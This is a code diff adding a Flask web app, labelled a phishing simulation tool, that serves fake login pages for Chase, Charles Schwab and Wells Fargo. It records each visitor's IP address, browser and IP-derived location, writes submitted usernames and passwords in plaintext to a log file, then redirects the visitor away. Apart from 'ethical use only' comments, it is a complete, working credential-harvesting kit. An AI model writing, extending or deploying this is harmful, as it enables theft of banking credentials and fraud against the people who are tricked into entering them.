@@ -1,0 +1,69 @@
+import os
+import requests  # Added for geolocation
+import logging
+from flask import Flask, request, render_template, redirect
+from datetime import datetime
+
+app = Flask(__name__)
+
+# Configure logging for session tracking
+logging.basicConfig(filename='sessions.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+# Bank templates directory
+TEMPLATES_DIR = 'templates/banks'
+if not os.path.exists(TEMPLATES_DIR):
+    os.makedirs(TEMPLATES_DIR)
+
+# Sample bank pages (extend with real templates for testing)
+BANK_TEMPLATES = {
+    "chase": "chase_login.html",
+    "charlesschwab": "charlesschwab_login.html",
+    "wellsfargo": "wellsfargo_login.html"
+}
+
+@app.route('/')
+def index():
+    return "<h2>Phishing Simulation Tool Running...</h2>"
+
+@app.route('/<bank>')
+def bank_login(bank):
+    if bank in BANK_TEMPLATES:
+        log_session(bank)
+        if os.path.exists(f"templates/banks/{BANK_TEMPLATES[bank]}"):
+            return render_template(BANK_TEMPLATES[bank])
+        else:
+            return "<h3>Error: Template not found</h3>", 404
+    else:
+        return "<h3>Error: Invalid bank template</h3>", 404
+
+@app.route('/submit', methods=['POST'])
+def submit():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    log_credentials(username, password)
+    return redirect("https://www.example.com")  # Redirect to real site after testing
+
+# Log session data with geolocation
+def log_session(bank):
+    user_ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+    location_data = get_geolocation(user_ip)  # Get location based on IP
+    
+    logging.info(f"Bank: {bank}, IP: {user_ip}, Location: {location_data}, User-Agent: {user_agent}")
+
+# Function to get geolocation from IP
+def get_geolocation(ip):
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip}")
+        data = response.json()
+        return f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
+    except:
+        return "Location Not Found"
+
+# Log captured credentials (ethical use only)
+def log_credentials(username, password):
+    with open('credentials.log', 'a') as f:
+        f.write(f"{datetime.now()} - Username: {username}, Password: {password}\n")
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
